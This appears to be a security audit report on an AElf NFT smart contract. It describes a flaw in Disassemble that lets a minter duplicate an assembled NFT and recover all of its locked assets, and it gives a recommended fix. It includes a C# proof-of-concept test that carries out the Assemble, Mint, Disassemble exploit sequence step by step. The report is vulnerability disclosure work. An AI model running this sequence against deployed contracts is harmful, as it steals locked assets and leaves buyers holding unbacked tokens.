# Audit Report

## Title
Asset Duplication via Disassemble with Multiple NFT Copies

## Summary
The `Disassemble` function contains a critical logic flaw where it hardcodes the burn amount to 1 while unconditionally removing all assembled asset mappings. When combined with the `IsTokenIdReuse` protocol setting, attackers with minting privileges can create multiple copies of an assembled NFT, disassemble once to recover all underlying assets, and retain fraudulent copies with no backing.

## Finding Description

The vulnerability stems from three interacting components in the NFT contract:

**1. Disassemble burns only 1 token but removes all mappings**

The `Disassemble` function hardcodes the burn amount regardless of total quantity: [1](#0-0) 

It then unconditionally removes the assembled asset mappings: [2](#0-1) [3](#0-2) 

**2. Assemble creates with enforced uniqueness**

The `Assemble` function forces token ID uniqueness by passing `isTokenIdMustBeUnique=true` to `PerformMint`: [4](#0-3) 

**3. Mint can add quantity when IsTokenIdReuse=true**

The public `Mint` function calls `PerformMint` with default `isTokenIdMustBeUnique=false`: [5](#0-4) 

In `PerformMint`, the uniqueness check logic is: [6](#0-5) 

When `IsTokenIdReuse=true` (a legitimate protocol configuration), the condition evaluates to `if (!true || false)` = `if (false)`, skipping the assertion and allowing the else branch to add quantity: [7](#0-6) 

**4. State mappings are per-token, not per-quantity**

The assembled asset mappings are keyed by token hash only: [8](#0-7) 

This means all copies of an assembled NFT reference the same single set of underlying assets.

**Attack Sequence:**
1. Attacker (a minter) assembles valuable NFTs/FTs into an assembled NFT (quantity=1)
2. Attacker calls `Mint` with the same tokenId, adding quantity (quantity becomes 2+)
3. Attacker calls `Disassemble` once, burning 1 but recovering ALL underlying assets
4. Attacker retains remaining copies which appear legitimate but have no backing

## Impact Explanation

This vulnerability enables **HIGH severity** direct asset theft:

- **Asset Theft**: Attackers extract all underlying NFTs/FTs locked in assembled tokens while retaining unbacked copies
- **Fraudulent NFTs**: Unbacked assembled NFTs circulate, appearing legitimate but having no redeemable value
- **Buyer Fraud**: Innocent purchasers of these fraudulent tokens lose their investment when they attempt to disassemble and discover no underlying assets exist
- **Protocol Damage**: Complete loss of trust in the assembly system, potential systemic failure if widely exploited
- **Arbitrary Value**: The attack works regardless of the value of underlying assets, enabling theft of any valuable NFT/FT combinations

The impact is concrete and measurable - direct theft of protocol-owned assets with immediate financial consequences.

## Likelihood Explanation

The attack requires two preconditions that make it **MEDIUM likelihood**:

**Precondition 1: Protocol has IsTokenIdReuse=true**
This is a legitimate protocol configuration option defined in the Create function: [9](#0-8) 

Protocols may enable this for valid operational reasons (e.g., allowing token ID reuse after burns in game mechanics).

**Precondition 2: Attacker has minter privileges**
Required by the Burn function's permission check: [10](#0-9) 

Minter privileges are granted by protocol creators and may be distributed to partners, game operators, or other semi-trusted parties. This is NOT a fully trusted role - minters should be able to mint/burn tokens but should NOT be able to break protocol invariants and steal locked assets.

**Attack Complexity: LOW**
- Simple 3-step sequence: Assemble → Mint → Disassemble
- No timing dependencies or race conditions
- No complex state manipulation required
- Difficult to detect until assets are withdrawn
- Easily reproducible once preconditions are met

## Recommendation

Add a quantity check in the `Disassemble` function to ensure it only works when the NFT quantity is exactly 1:

```csharp
public override Empty Disassemble(DisassembleInput input)
{
    var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
    var nftInfo = GetNFTInfoByTokenHash(tokenHash);
    
    // Only allow disassembly when quantity is exactly 1
    Assert(nftInfo.Quantity == 1, 
        "Cannot disassemble: multiple copies exist. Burn excess copies first.");
    
    Burn(new BurnInput
    {
        Symbol = input.Symbol,
        TokenId = input.TokenId,
        Amount = 1
    });
    
    // ... rest of function
}
```

Alternatively, prevent minting additional copies of assembled NFTs by checking if a token is assembled before allowing quantity increases, or redesign the assembled asset mappings to track quantities properly.

## Proof of Concept

```csharp
[Fact]
public async Task AssetDuplication_Via_Disassemble_With_Multiple_Copies()
{
    // Setup: Create protocol with IsTokenIdReuse=true
    var createResult = await NFTContractStub.Create.SendAsync(new CreateInput
    {
        BaseUri = "ipfs://test/",
        Creator = DefaultAddress,
        IsBurnable = true,
        IsTokenIdReuse = true, // Enable token ID reuse
        NftType = NFTType.Collectables.ToString(),
        ProtocolName = "VULN_TEST",
        TotalSupply = 1_000_000
    });
    var symbol = createResult.Output.Value;
    
    // Add minter
    await NFTContractStub.AddMinters.SendAsync(new AddMintersInput
    {
        Symbol = symbol,
        MinterList = new MinterList { Value = { MinterAddress } }
    });
    
    // Mint underlying NFT to assemble
    var underlyingToken = await MinterNFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = symbol,
        Quantity = 1,
        Owner = MinterAddress
    });
    
    // Approve ELF for assembly
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Symbol = "ELF",
        Amount = 1000,
        To = MinterAddress
    });
    await GetTester<TokenContractImplContainer.TokenContractImplStub>(
        TokenContractAddress, MinterKeyPair).Approve.SendAsync(
        new MultiToken.ApproveInput
        {
            Spender = NFTContractAddress,
            Symbol = "ELF",
            Amount = 1000
        });
    
    // Step 1: Assemble valuable assets (quantity=1)
    var assembleResult = await MinterNFTContractStub.Assemble.SendAsync(new AssembleInput
    {
        Symbol = symbol,
        TokenId = 100, // Specify tokenId
        AssembledNfts = new AssembledNfts { Value = { [underlyingToken.Output.ToHex()] = 1 } },
        AssembledFts = new AssembledFts { Value = { ["ELF"] = 100 } }
    });
    
    var assembledHash = assembleResult.Output;
    
    // Verify initial state: quantity=1, assets locked
    var nftInfo1 = await NFTContractStub.GetNFTInfoByTokenHash.CallAsync(assembledHash);
    nftInfo1.Quantity.ShouldBe(1);
    
    // Step 2: Mint additional copy (exploits IsTokenIdReuse=true)
    await MinterNFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = symbol,
        TokenId = 100, // Same tokenId
        Quantity = 1,
        Owner = MinterAddress
    });
    
    // Verify: quantity increased to 2
    var nftInfo2 = await NFTContractStub.GetNFTInfoByTokenHash.CallAsync(assembledHash);
    nftInfo2.Quantity.ShouldBe(2);
    
    // Step 3: Disassemble once - steals ALL underlying assets
    await MinterNFTContractStub.Disassemble.SendAsync(new DisassembleInput
    {
        Symbol = symbol,
        TokenId = 100,
        Owner = MinterAddress
    });
    
    // Verify exploit success:
    // 1. Minter received underlying assets
    var underlyingBalance = await NFTContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Symbol = symbol,
        TokenId = 1,
        Owner = MinterAddress
    });
    underlyingBalance.Balance.ShouldBe(1); // Assets recovered
    
    var elfBalance = await TokenContractStub.GetBalance.CallAsync(new MultiToken.GetBalanceInput
    {
        Symbol = "ELF",
        Owner = MinterAddress
    });
    elfBalance.Balance.ShouldBeGreaterThanOrEqualTo(100); // FTs recovered
    
    // 2. But assembled NFT still has 1 copy remaining (fraudulent, no backing)
    var finalInfo = await NFTContractStub.GetNFTInfoByTokenHash.CallAsync(assembledHash);
    finalInfo.Quantity.ShouldBe(1); // Fraudulent copy remains
    
    var assembledBalance = await NFTContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Symbol = symbol,
        TokenId = 100,
        Owner = MinterAddress
    });
    assembledBalance.Balance.ShouldBe(1); // Attacker retains fraudulent copy
    
    // 3. Assembled asset mappings are gone (no backing assets)
    var assembledNfts = await NFTContractStub.GetAssembledNfts.CallAsync(assembledHash);
    assembledNfts.Value.Count.ShouldBe(0); // No backing assets!
}
```

## Notes

This vulnerability represents a fundamental logic error in the `Disassemble` function's design. The function was not designed to handle the case where multiple copies of an assembled NFT exist, which becomes possible when `IsTokenIdReuse=true` allows quantity increases on existing tokens. The minter role should be considered semi-trusted - while minters can create and burn tokens, they should not be able to violate the core invariant that assembled NFTs must have backing assets. The exploit is straightforward and results in direct, measurable asset theft with cascading effects on protocol integrity and user trust.

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L17-17)
```csharp
        var nftMinted = PerformMint(input);
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L89-93)
```csharp
        var minterList = State.MinterListMap[input.Symbol] ?? new MinterList();
        Assert(
            State.BalanceMap[tokenHash][Context.Sender] >= input.Amount &&
            minterList.Value.Contains(Context.Sender),
            "No permission.");
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L175-175)
```csharp
        var nftMinted = PerformMint(mingInput, true);
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L193-198)
```csharp
        Burn(new BurnInput
        {
            Symbol = input.Symbol,
            TokenId = input.TokenId,
            Amount = 1
        });
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L209-209)
```csharp
            State.AssembledNftsMap.Remove(tokenHash);
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L224-224)
```csharp
            State.AssembledFtsMap.Remove(tokenHash);
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L395-396)
```csharp
        if (!protocolInfo.IsTokenIdReuse || isTokenIdMustBeUnique)
            Assert(nftInfo == null, $"Token id {tokenId} already exists. Please assign a different token id.");
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L433-437)
```csharp
        else
        {
            nftInfo.Quantity = nftInfo.Quantity.Add(quantity);
            if (!nftInfo.Minters.Contains(Context.Sender)) nftInfo.Minters.Add(Context.Sender);
        }
```

**File:** contract/AElf.Contracts.NFT/NFTContractState.cs (L32-33)
```csharp
    public MappedState<Hash, AssembledNfts> AssembledNftsMap { get; set; }
    public MappedState<Hash, AssembledFts> AssembledFtsMap { get; set; }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Create.cs (L48-48)
```csharp
            IsTokenIdReuse = input.IsTokenIdReuse,
```
